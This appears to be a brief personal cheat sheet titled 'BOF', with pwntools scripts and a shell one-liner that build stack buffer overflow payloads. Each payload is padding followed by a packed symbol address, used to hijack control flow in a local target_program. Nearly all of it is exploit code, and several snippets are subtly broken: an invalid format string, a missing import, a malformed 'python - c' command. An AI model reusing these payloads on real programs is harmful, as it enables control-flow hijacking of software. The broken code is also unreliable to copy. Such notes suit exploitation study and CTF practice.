# BOF

*[image unavailable]*

```python
import struct
import pwn
e = ELF('./target_program')
padd = "AAAAABBBBCCCCDDDDEEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWYYYYXXXXZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyyzzzz1111222233334444555566667777888899990000deadbeefsnowtreerockhailrainfourfive"
addr = 0xdeadbeef #REPLACE WITH ADDRESS, converted in SHELLCODE FUNCTION
sym_addr = e.symbols['addr']
shellcode = ''.join('\x{:02x}'.format(b) for b in struct.pack('<I', sym_addr)) #upper i
print(shellcode)
```

```python
from pwn import *
e = ELF('/target_program')
payload  = cyclic(32)
payload += p32(e.symbols['misc'])
print(hex(e.symbols['misc']))
p = process('target_program')
p.sendline(payload)
p.interactive()
'''
f=open('exploit', 'wb')
f.write(payload)
f.close()
'''
```

```bash
python3 test.py $(python - c 'print "A"*32 + "\xef\xbe\xad\xde"')
```

```python
from pwn import *
e = ELF('./target_program')
payload  = cyclic(32) + p32(e.symbols['misc'])
print(f"Payload: {payload}")
p = process(['target_program', payload])
print(p.recv().decode())
p.close()
```

*[image unavailable]*
